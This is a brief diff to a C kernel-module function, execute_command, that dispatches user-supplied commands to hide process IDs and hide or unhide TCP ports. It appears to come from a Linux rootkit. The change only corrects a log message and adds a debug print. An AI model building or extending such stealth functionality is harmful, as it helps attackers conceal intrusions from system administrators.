@@ -807,9 +807,10 @@ int execute_command(const char __user *str, size_t length)
         pid_remove(str);
 	    
     } else if (strcmp(str, CFG_HIDE_PORT) == 0) {
-        pr_info("Got unhide port command\n");
+        pr_info("Got hide port command\n");
         str += sizeof(CFG_HIDE_PORT);
 	hide_tcp4_port(str);
+        pr_info("str is: %s\n",str);
 	    
     } else if (strcmp(str, CFG_UNHIDE_PORT) == 0) {
         pr_info("Got unhide port command\n");
